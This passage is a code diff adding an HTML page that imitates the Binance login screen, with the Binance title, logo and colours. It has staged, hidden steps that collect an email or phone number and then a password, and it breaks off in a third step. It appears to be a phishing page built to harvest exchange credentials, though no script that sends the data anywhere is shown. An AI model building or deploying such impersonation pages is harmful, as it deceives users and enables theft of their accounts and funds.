@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link
+      rel="stylesheet"
+      href="https://cdn.jsdelivr.net/npm/rippleui@1.12.1/dist/css/styles.css"
+    />
+    <script>
+      tailwind.config = {
+        theme: {
+          extend: {
+            colors: {
+              bnbg: "#da373d",
+              bnfg: "#da373d",
+              bnscbg: "#da373d",
+              bnscfg: "#da373d",
+            },
+          },
+        },
+      };
+    </script>
+    <title>Log in | Binance</title>
+  </head>
+  <body class="overflow-hidden">
+    <div id="step1"
+      class="flex flex-col items-center justify-start min-h-screen bg-[#12161c] text-white px-4 py-5"
+    >
+      <div class="w-full max-w-sm">
+        <div class="flex justify-start sm:justify-center mb-6">
+          <img class="w-1/3" src="data:image/png;base64,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">
+        </div>
+        <h1 class="text-3xl font-bold sm:text-center mb-6">Log in</h1>
+        <div class="flex flex-col space-y-4">
+          <p>Email/Phone number</p>
+          <input id="step1Input"
+            class="flex h-10 w-full px-3 py-2 text-sm ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 bg-transparent text-white border border-[#2b2f36] rounded-md"
+            type="text"
+          />
+          <button id="step1Btn"
+            class="inline-flex items-center justify-center whitespace-nowrap rounded-md text-sm font-bold ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 hover:bg-[#f0b90b]/90 h-10 px-4 py-2 bg-[#f0b90b] text-[#1E242D]"
+          >
+            Next
+          </button>
+          <div class="flex items-center justify-center">
+            <div class="bg-[#2b2f36] h-px flex-grow"></div>
+            <span class="px-4 text-sm text-[#62666d]">or</span>
+            <div class="bg-[#2b2f36] h-px flex-grow"></div>
+          </div>
+        </div>
+        <div class="flex justify-center mt-6">
+          <button
+            class="inline-flex items-center justify-center whitespace-nowrap rounded-md text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 hover:bg-accent hover:text-accent-foreground h-10 px-4 py-2 text-[#f0b90b]"
+          >
+            Create a Binance Account
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <div id="step2"
+      class="flex flex-col items-center justify-start min-h-screen bg-[#12161c] text-white px-4 py-5 hidden"
+    >
+      <div class="w-full max-w-sm">
+        <div class="flex justify-start sm:justify-center mb-6">
+          <img class="w-1/3" src="data:image/png;base64,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">
+        </div>
+        <h1 class="text-3xl font-bold sm:text-center my-2">Enter your password</h1>
+        <p class="text-gray-500 mb-10" id="emailDisplay1">e****@email.com</p>
+        <div class="flex flex-col space-y-4">
+          <p>Password</p>
+          <input id="step2Input"
+            class="flex h-10 w-full px-3 py-2 text-sm ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 bg-transparent text-white border border-[#2b2f36] rounded-md"
+            type="password"
+          />
+          <button id="step2Btn"
+            class="inline-flex items-center justify-center whitespace-nowrap rounded-md text-sm font-bold ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 hover:bg-[#f0b90b]/90 h-10 px-4 py-2 bg-[#f0b90b] text-[#1E242D]"
+          >
+            Next
+          </button>
+        </div>
+        <div class="flex justify-center mt-6">
+          <button
+            class="inline-flex items-center justify-center whitespace-nowrap rounded-md text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 hover:bg-accent hover:text-accent-foreground h-10 px-4 py-2 text-[#f0b90b]"
+          >
+            Forgot password?
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <div id="step3"
+      class="flex flex-col items-center justify-start min-h-screen bg-[#12161c] text-white px-4 py-5 hidden"
+    >
+      <div class="w-full max-w-sm">
+        <div class="flex justify-start sm:justify-center mb-6">
+          <img class="w-1/3" src="data:image/png;base64,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